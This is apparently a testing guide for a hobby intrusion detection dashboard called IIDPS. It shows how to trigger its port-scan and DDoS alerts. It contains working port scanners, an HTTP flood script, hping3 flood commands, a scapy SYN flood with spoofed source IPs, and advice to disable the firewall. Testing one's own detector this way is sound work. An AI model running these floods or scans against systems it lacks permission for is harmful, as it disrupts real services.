# IIDPS NEXUS — Attack Testing Guide

> **⚠️ WARNING:** Only perform these attacks on your **own system** or systems you have **explicit permission** to test. Unauthorized network attacks are illegal.

This guide explains how to generate **real network attack traffic** from an external terminal/machine so that your IIDPS backend detects it via its ML engine and displays the alerts on the frontend dashboard.

---

## Prerequisites

1. **Your IIDPS backend is running:**
   ```powershell
   cd backend
   python main.py
   ```
2. **Your frontend is running:**
   ```powershell
   cd frontend
   npm run dev
   ```
3. **Docker containers (PostgreSQL + Redis) are running:**
   ```powershell
   docker-compose up -d
   ```
4. **Find your machine's local IP** (needed if attacking from another device):
   ```powershell
   ipconfig
   ```
   Look for your **IPv4 Address** under your active adapter (e.g., `192.168.1.105`).

---

## How Detection Works

Your `network_monitor.py` reads **real OS-level network data** every 2 seconds using `psutil`:

| Feature | Source | What Triggers Alerts |
|---|---|---|
| `bandwidth_usage_mbps` | `psutil.net_io_counters()` | Spikes above ~50 Mbps → DDoS |
| `concurrent_connections` | `psutil.net_connections()` | Spikes above ~1000 → DDoS |
| `distinct_dest_ports` | Unique remote ports from connections | Above ~100 ports → Port Scan |
| `failed_auth_attempts` | Currently hardcoded to 0 | Not yet wired |

The ML model (Random Forest) classifies the live data into: **Normal**, **DDoS Attempt**, **Port Scan**, or **Brute Force**.

---

## Attack 1: Port Scan

**Goal:** Scan many ports on your machine rapidly. The ML engine sees a spike in `distinct_dest_ports` and classifies it as a **Port Scan**.

### Option A: Using Nmap (Recommended)

Install Nmap from [https://nmap.org/download.html](https://nmap.org/download.html), then from **another terminal or machine**:

```bash
# Scan all 65535 ports on target machine
nmap -sS -p 1-65535 <YOUR_IP>

# Example:
nmap -sS -p 1-65535 192.168.1.105

# Quick scan of top 1000 ports (faster)
nmap -sS 192.168.1.105

# Aggressive scan with OS detection
nmap -A -T4 192.168.1.105
```

### Option B: Using PowerShell (No Install Needed)

From **a separate PowerShell window** on the same machine:

```powershell
# Rapid port scan - connects to 1000 ports on localhost
1..1000 | ForEach-Object {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect("127.0.0.1", $_)
        $tcp.Close()
    } catch {}
}
```

For a more aggressive version:
```powershell
# Scan 5000 ports in parallel
1..5000 | ForEach-Object -Parallel {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect("127.0.0.1", $_)
        $tcp.Close()
    } catch {}
} -ThrottleLimit 100
```

### Option C: Using Python (From Another Machine)

Save this as `port_scan.py` on the attacking machine:

```python
import socket
import threading

TARGET = "192.168.1.105"  # Replace with your IIDPS machine's IP

def scan_port(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        s.connect((TARGET, port))
        print(f"[OPEN] Port {port}")
        s.close()
    except:
        pass

threads = []
for port in range(1, 5000):
    t = threading.Thread(target=scan_port, args=(port,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Port scan complete.")
```

Run it:
```bash
python port_scan.py
```

**Expected Result:** Your IIDPS dashboard should show a **"Port Scan"** alert within 2-4 seconds.

---

## Attack 2: DDoS / DoS (Connection Flood)

**Goal:** Flood your machine with massive HTTP requests to spike `bandwidth_usage_mbps` and `concurrent_connections`.

### Option A: Using PowerShell (Simple HTTP Flood)

From **a separate terminal**:

```powershell
# HTTP flood - sends rapid requests to your backend
while ($true) {
    try {
        Invoke-WebRequest -Uri "http://localhost:8000/" -TimeoutSec 1 -ErrorAction SilentlyContinue
    } catch {}
}
```

**Open 5-10 terminals running this simultaneously** for maximum effect.

### Option B: Using Python (From Another Machine)

Save as `dos_flood.py` on the attacking machine:

```python
import requests
import threading
import time

TARGET = "http://192.168.1.105:8000/"  # Replace with your IIDPS machine's IP
THREADS = 50
DURATION = 60  # seconds

stop = False

def flood():
    while not stop:
        try:
            requests.get(TARGET, timeout=1)
        except:
            pass

print(f"Starting DoS flood on {TARGET} with {THREADS} threads for {DURATION}s...")
threads = []
for _ in range(THREADS):
    t = threading.Thread(target=flood)
    t.start()
    threads.append(t)

time.sleep(DURATION)
stop = True

for t in threads:
    t.join()

print("Flood complete.")
```

Run it:
```bash
python dos_flood.py
```

### Option C: Using `hping3` (Linux/WSL)

If you have WSL or a Linux machine:

```bash
# SYN flood (requires root)
sudo hping3 -S --flood -p 8000 192.168.1.105

# UDP flood
sudo hping3 --udp --flood -p 8000 192.168.1.105
```

**Expected Result:** Your IIDPS dashboard should show a **"DDoS Attempt"** alert when bandwidth/connections spike.

---

## Attack 3: TCP SYN Flood

**Goal:** Send half-open TCP connections to exhaust resources.

### Using Python (From Another Machine)

Save as `syn_flood.py`:

```python
from scapy.all import *
import random

TARGET = "192.168.1.105"  # Replace with your IIDPS machine's IP
PORT = 8000

print(f"Starting SYN flood on {TARGET}:{PORT}...")
while True:
    src_port = random.randint(1024, 65535)
    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    pkt = IP(src=src_ip, dst=TARGET) / TCP(sport=src_port, dport=PORT, flags="S")
    send(pkt, verbose=0)
```

> **Note:** Requires `scapy` (`pip install scapy`) and **admin/root privileges**.

---

## Attack 4: From a Second Computer on Your Network

If you have another laptop/PC on the same Wi-Fi:

1. Find your IIDPS machine's IP: `ipconfig` → e.g., `192.168.1.105`
2. Make sure the backend is accessible: open `http://192.168.1.105:8000/` from the other machine's browser
3. Run **any of the above scripts** from that second machine, replacing `localhost` with `192.168.1.105`

This is the most realistic test since traffic arrives from an **external source IP**.

---

## Attack 5: Using a Phone (Quick Test)

1. Find your PC's IP address (`ipconfig`)
2. Ensure your phone is on the **same Wi-Fi**
3. Open a browser on your phone and rapidly refresh `http://192.168.1.105:8000/` many times
4. Or use an app like **"HTTP Flood"** or **"Termux"** (Android) to run the Python scripts

---

## Monitoring Results

After running any attack:

1. **Dashboard Tab** → Watch the "Real-Time Threat Feed" section for new alerts
2. **Alerts Tab** → See the Attack Distribution donut chart update with detected attack types
3. **Backend Terminal** → Watch for `[Network Monitor]` log messages showing ML predictions
4. **DEFCON Level** → Should drop from 5 toward 1 as more threats are detected

---

## Resetting After Testing

To clear all alerts and reset the system:

```powershell
# From any terminal
curl -X POST http://localhost:8000/api/actions/clear-logs
```

Or use the **"Clear All Logs"** button in the Quick Actions tab.

---

## Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| No alerts appearing | Traffic not high enough to trigger ML | Use more threads / open more terminals |
| "Normal" classification only | Your normal traffic is within training range | Generate **more aggressive** traffic (more ports, more connections) |
| Port scan not detected | Firewall blocking connections | Temporarily disable Windows Firewall for testing |
| Backend not accessible from other device | Firewall blocking port 8000 | Run: `netsh advfirewall firewall add rule name="IIDPS" dir=in action=allow protocol=TCP localport=8000` |

---

## Quick Reference

| Attack Type | Key Metric | Trigger Threshold | Best Tool |
|---|---|---|---|
| **Port Scan** | `distinct_dest_ports` | >100 unique ports | `nmap` or Python scanner |
| **DDoS Attempt** | `bandwidth + connections` | >50 Mbps or >1000 connections | HTTP flood script |
| **Brute Force** | `failed_auth_attempts` | >10 failures | (Not yet wired in monitor) |
